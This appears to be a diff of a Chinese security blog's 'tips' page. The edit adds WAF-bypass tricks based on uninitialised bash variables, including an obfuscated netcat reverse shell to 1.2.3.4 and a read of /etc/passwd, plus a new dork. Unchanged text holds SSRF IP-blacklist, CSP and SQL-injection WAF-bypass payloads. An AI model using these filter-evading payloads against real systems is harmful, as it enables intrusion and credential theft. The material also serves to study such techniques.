@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">420</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">484</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -406,9 +406,17 @@ height:50vh;
 <h3 id="命令执行tips"><a href="#命令执行tips" class="headerlink" title="命令执行tips"></a>命令执行tips</h3><h4 id="用echo的cat命令执行"><a href="#用echo的cat命令执行" class="headerlink" title="用echo的cat命令执行"></a>用echo的cat命令执行</h4><p>原理就是借用echo重定向，来输出字符，使用反引号进行命令执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `<span class="keyword">echo</span> -n <span class="string">'/etc'</span>|| <span class="keyword">echo</span> <span class="string">'/shit'</span>&amp;&amp; <span class="keyword">echo</span> <span class="string">'/passwd'</span>`</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.fuzzer.xyz/images/tips/1.png" alt></p>
+<h4 id="使用未初始化的Bash变量绕过基于WAF"><a href="#使用未初始化的Bash变量绕过基于WAF" class="headerlink" title="使用未初始化的Bash变量绕过基于WAF"></a>使用未初始化的Bash变量绕过基于WAF</h4><p>其中<strong>$ U</strong>不存在，它会被视为由bash的一个空字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$u /etc$u/passwd$u</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/tips/9.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc$u -e /bin$u/bash$u 1.2.3.4 1337</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/tips/10.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/tips/11.png" alt></p>
 <h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="IP地址黑名单"><a href="#IP地址黑名单" class="headerlink" title="IP地址黑名单"></a>IP地址黑名单</h4><p>通过去掉0来绕过SSRF或者重定向的黑名单</p>
 <p>例子：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://1.0.0.1 → http://1.1</span><br><span class="line">http://192.168.0.1 → http://192.168.1</span><br><span class="line">http://127.0.0.1 -&gt; http://127.1</span><br></pre></td></tr></table></figure>
+<h4 id="使用-绕过文件限制"><a href="#使用-绕过文件限制" class="headerlink" title="使用./绕过文件限制"></a>使用./绕过文件限制</h4><p><img src="https://www.fuzzer.xyz/images/tips/13.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/tips/12.png" alt></p>
 <h4 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h4><p>如果CSP策略指向dir并且你使用<code>％2f</code>来编码<code>/</code>，则仍然认为它位于目录内</p>
 <p><code>%2f..%2f</code></p>
 <p><img src="https://www.fuzzer.xyz/images/tips/2.png" alt></p>
@@ -416,7 +424,7 @@ height:50vh;
 <p><strong>XSS cheat sheet</strong></p>
 <p><code>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</code></p>
 <h3 id="资产搜集"><a href="#资产搜集" class="headerlink" title="资产搜集"></a>资产搜集</h3><h4 id="Bash简洁式"><a href="#Bash简洁式" class="headerlink" title="Bash简洁式"></a>Bash简洁式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL http://index.commoncrawl.org | grep <span class="string">'href="/CC'</span>  |  awk -F<span class="string">'"'</span> <span class="string">'&#123;print $2&#125;'</span> | xargs -n1 -I&#123;&#125; curl -sL http://index.commoncrawl.org&#123;&#125;-index?url=http://uber.com* |  awk -F<span class="string">'"url":\ "'</span> <span class="string">'&#123;print $2&#125;'</span> | cut -d<span class="string">'"'</span> -f1 | sort -u | tee domain.txt</span><br></pre></td></tr></table></figure>
-<h4 id="好用的dork"><a href="#好用的dork" class="headerlink" title="好用的dork"></a>好用的dork</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:*.site.com -www </span><br><span class="line">site:*.*.site.com -www </span><br><span class="line">site:*.*.*.site.com -www</span><br></pre></td></tr></table></figure>
+<h4 id="好用的dork"><a href="#好用的dork" class="headerlink" title="好用的dork"></a>好用的dork</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:*.site.com -www </span><br><span class="line">site:*.*.site.com -www </span><br><span class="line">site:*.*.*.site.com -www</span><br><span class="line">inurl:<span class="string">"http://att.com:8080"</span></span><br></pre></td></tr></table></figure>
 <h3 id="重定向Bypass"><a href="#重定向Bypass" class="headerlink" title="重定向Bypass"></a>重定向Bypass</h3><p><img src="https://www.fuzzer.xyz/images/tips/3.png" alt></p>
 <h3 id="SQL-injection-bypass-waf"><a href="#SQL-injection-bypass-waf" class="headerlink" title="SQL injection bypass waf"></a>SQL injection bypass waf</h3><p>看到了很有趣的SQL注入绕过waf的tricks，所以记录下来。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT-1e1FROM`<span class="built_in">test</span>`</span><br><span class="line">SELECT~1.FROM`<span class="built_in">test</span>`</span><br><span class="line">SELECT\NFROM`<span class="built_in">test</span>`</span><br><span class="line">SELECT@^1.FROM`<span class="built_in">test</span>`</span><br><span class="line">SELECT-id-1.FROM`<span class="built_in">test</span>`</span><br></pre></td></tr></table></figure>
@@ -590,7 +598,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题记"><span class="toc-number">1.</span> <span class="toc-text">题记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行tips"><span class="toc-number">2.</span> <span class="toc-text">命令执行tips</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用echo的cat命令执行"><span class="toc-number">2.1.</span> <span class="toc-text">用echo的cat命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">3.</span> <span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IP地址黑名单"><span class="toc-number">3.1.</span> <span class="toc-text">IP地址黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">3.2.</span> <span class="toc-text">CSP Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-WAF-Bypass"><span class="toc-number">4.</span> <span class="toc-text">XSS WAF Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#资产搜集"><span class="toc-number">5.</span> <span class="toc-text">资产搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash简洁式"><span class="toc-number">5.1.</span> <span class="toc-text">Bash简洁式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#好用的dork"><span class="toc-number">5.2.</span> <span class="toc-text">好用的dork</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重定向Bypass"><span class="toc-number">6.</span> <span class="toc-text">重定向Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-injection-bypass-waf"><span class="toc-number">7.</span> <span class="toc-text">SQL injection bypass waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fun-discuss"><span class="toc-number">8.</span> <span class="toc-text">Fun discuss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois-for-data"><span class="toc-number">8.1.</span> <span class="toc-text">whois for data</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题记"><span class="toc-number">1.</span> <span class="toc-text">题记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行tips"><span class="toc-number">2.</span> <span class="toc-text">命令执行tips</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用echo的cat命令执行"><span class="toc-number">2.1.</span> <span class="toc-text">用echo的cat命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用未初始化的Bash变量绕过基于WAF"><span class="toc-number">2.2.</span> <span class="toc-text">使用未初始化的Bash变量绕过基于WAF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">3.</span> <span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IP地址黑名单"><span class="toc-number">3.1.</span> <span class="toc-text">IP地址黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-绕过文件限制"><span class="toc-number">3.2.</span> <span class="toc-text">使用./绕过文件限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">3.3.</span> <span class="toc-text">CSP Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-WAF-Bypass"><span class="toc-number">4.</span> <span class="toc-text">XSS WAF Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#资产搜集"><span class="toc-number">5.</span> <span class="toc-text">资产搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash简洁式"><span class="toc-number">5.1.</span> <span class="toc-text">Bash简洁式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#好用的dork"><span class="toc-number">5.2.</span> <span class="toc-text">好用的dork</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重定向Bypass"><span class="toc-number">6.</span> <span class="toc-text">重定向Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-injection-bypass-waf"><span class="toc-number">7.</span> <span class="toc-text">SQL injection bypass waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fun-discuss"><span class="toc-number">8.</span> <span class="toc-text">Fun discuss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois-for-data"><span class="toc-number">8.1.</span> <span class="toc-text">whois for data</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -603,34 +611,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1231,12 +1211,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
         </li>
     
     
@@ -1373,31 +1353,31 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
     
         <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
     
-        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+        <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
-        <span class="sidebar-tag-name" data-tags="csrf，getshell"><span class="iconfont-archer">&#xe606;</span>csrf，getshell</span>
-    
         <span class="sidebar-tag-name" data-tags="tips"><span class="iconfont-archer">&#xe606;</span>tips</span>
+    
+        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="csrf，getshell"><span class="iconfont-archer">&#xe606;</span>csrf，getshell</span>
     
         <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
-    
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
     
         <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
     
@@ -1421,9 +1401,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="安卓架构"><span class="iconfont-archer">&#xe606;</span>安卓架构</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="SRC"><span class="iconfont-archer">&#xe606;</span>SRC</span>
     
@@ -1470,9 +1450,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="系统安全"><span class="iconfont-archer">&#xe60a;</span>系统安全</span>
     
-        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
-    
         <span class="sidebar-category-name" data-categories="移动安全"><span class="iconfont-archer">&#xe60a;</span>移动安全</span>
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
